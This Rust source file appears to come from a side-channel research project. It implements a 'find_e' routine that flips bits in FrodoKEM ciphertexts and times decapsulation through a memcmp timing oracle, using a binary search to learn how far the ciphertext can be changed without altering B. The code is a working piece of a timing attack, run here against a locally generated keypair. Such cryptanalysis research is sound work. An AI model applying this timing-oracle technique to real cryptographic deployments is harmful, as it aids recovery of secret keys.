use crate::attack::memcmp_frodo::MeasureSource;
use liboqs_rs_bindings::frodokem::FrodoKem;
use log::{debug, info, trace};
use log_derive::{logfn, logfn_inputs};
use std::convert::TryInto;

/// Function that dereministically modifies the input vector.
///
/// To undo apply the same modification one more time
#[logfn(Trace)]
fn modify<FRODO: FrodoKem>(ct: &mut FRODO::Ciphertext, amount: usize) {
    let ct = FRODO::as_slice(ct);
    let limit = ct.len() / 2;
    let bits_to_flip_per_byte = std::cmp::min(8, ((amount / limit) + 1) as u32);
    debug!(
        "amount: {}, limit: {}, bits to flip per byte: {}",
        amount, limit, bits_to_flip_per_byte
    );
    let pattern: u8 = ((2u16.pow(bits_to_flip_per_byte)) - 1)
        .try_into()
        .expect(&format!(
            "integer owerflow u8 2^{} - 1",
            bits_to_flip_per_byte
        ));
    let lower = std::cmp::max(limit, ct.len() - std::cmp::min(amount, ct.len()));
    let upper = ct.len();
    trace!(
        "Using pattern {} to xor bytes {}..{}",
        pattern,
        lower,
        upper,
    );
    for byte in lower..upper {
        ct[byte] ^= pattern;
    }
}

#[logfn(Trace)]
fn mod_measure<FRODO: FrodoKem>(
    amount: usize,
    iterations: usize,
    measure_source: &MeasureSource,
    ct: &mut FRODO::Ciphertext,
    ss: &mut FRODO::SharedSecret,
    sk: &mut FRODO::SecretKey,
) -> Result<u64, String> {
    modify::<FRODO>(ct, amount);
    let mut lowest = u64::max_value();
    for _ in 0..iterations {
        let m = measure_source.measure(|| FRODO::decaps_measure(ct, ss, sk));
        if let Some(time) = m? {
            if time < lowest {
                lowest = time;
            }
        };
    }
    modify::<FRODO>(ct, amount);

    Ok(lowest)
}

#[logfn_inputs(Trace)]
pub fn find_e<FRODO: FrodoKem>(
    warmup: usize,
    iterations: usize,
    start_mod: usize,
    measure_source: MeasureSource,
) -> Result<(), String> {
    info!(
        "Launching the find_e routine against {} MEMCMP vulnerability.",
        FRODO::name()
    );
    let mut public_key = FRODO::zero_pk();
    let mut secret_key = FRODO::zero_sk();
    let mut ciphertext = FRODO::zero_ct();
    let ctlen = FRODO::as_slice(&mut ciphertext).len();

    info!("Generating keypair");
    FRODO::keypair(&mut public_key, &mut secret_key)?;

    info!("Encapsulating shared secret and generating ciphertext");
    let mut shared_secret_e = FRODO::zero_ss();
    let mut shared_secret_d = FRODO::zero_ss();
    FRODO::encaps(&mut ciphertext, &mut shared_secret_e, &mut public_key)?;

    info!("Running decryption oracle {} times for warmup.", warmup);
    let warmuptime = mod_measure::<FRODO>(
        0,
        warmup,
        &measure_source,
        &mut ciphertext,
        &mut shared_secret_d,
        &mut secret_key,
    )?;
    debug!("Warmup time {}", warmuptime);

    info!("Running {} iterations with a low {} cipertext modification at the end of C to establish upper bound timing threshold.", iterations, start_mod);
    let threshold_high = mod_measure::<FRODO>(
        start_mod,
        iterations,
        &measure_source,
        &mut ciphertext,
        &mut shared_secret_d,
        &mut secret_key,
    )?;

    info!("Running {} iterations with a very major cipertext modification at the end of C to establish lower bound timing threshold.", iterations);
    let threshold_low = mod_measure::<FRODO>(
        ctlen,
        iterations,
        &measure_source,
        &mut ciphertext,
        &mut shared_secret_d,
        &mut secret_key,
    )?;

    let threshold = (threshold_high + threshold_low) / 2;
    info!(
        "Using ({}+{})/2={} as threshold value, everything below will be used to detect changes to B as well.", threshold_high, threshold_low,
        threshold
    );

    info!("Starting binary search for determining maximum modifications to C without changing B.");

    let mut high = ctlen; //flipping one bit .len() all bytes appear to be a good start position for the uppper limit
    let mut low = 0;
    let maxmod = loop {
        let currentmod = (high + low) / 2;
        debug!("high: {}, low: {}", high, low);
        info!(
            "Testing {} bitflips with {} iterations",
            currentmod, iterations
        );
        let time = mod_measure::<FRODO>(
            currentmod,
            iterations,
            &measure_source,
            &mut ciphertext,
            &mut shared_secret_d,
            &mut secret_key,
        )?;

        debug!("time measurment is {}", time);
        if time >= threshold {
            info!("Raising lowerbound to {}", currentmod);
            low = currentmod;
        } else {
            info!("Lowering upperbound to {}", currentmod);
            high = currentmod;
        }
        if high - low == 1 {
            break low;
        }
    };

    info!(
        "{} is the maximum amount of modifications that can be performed without affecting B",
        maxmod
    );

    Ok(())
}
